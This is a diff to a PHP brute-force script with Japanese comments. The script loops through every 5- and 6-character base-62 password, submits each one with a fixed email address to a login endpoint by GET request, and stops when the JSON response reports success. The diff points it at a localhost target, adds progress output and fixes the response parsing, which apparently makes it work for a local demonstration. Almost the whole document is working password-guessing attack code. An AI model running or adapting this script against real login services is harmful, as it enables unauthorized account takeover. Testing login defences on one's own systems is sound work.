@@ -9,7 +9,7 @@
 //---------------------------------------
 // 定数
 //---------------------------------------
-define('TARGET_URL', '/login/auth1.php');
+define('TARGET_URL', 'http://localhost/login/auth1.php');
 define('USER_ID',    'foo@example.com');
 define('LOOP_START', 14776336);				// 5桁の62進数のパターン数(10000)
 define('LOOP_MAX',   56800235583);			// 6桁の62進数のパターン数(ZZZZZZ)
@@ -24,12 +24,15 @@ for($i=LOOP_START; $i<=LOOP_MAX; $i++){
 	$pw = dec2dohex($i);
 	$url = sprintf('%s?email=%s&password=%s', TARGET_URL, USER_ID, $pw);
 
+	// 途中経過を表示
+	printf("%11d: %s\n", $i, $pw);
+
 	// APIを叩く
 	$buff = file_get_contents($url);
-	$json = json_decode($buff);
+	$json = json_decode($buff, true);
 
 	// 判定
-	if( $json['head']['status'] === true ){
+	if( $json['head']['result'] === true ){
 		echo "HIT! $pw\n";
 		break;
 	}
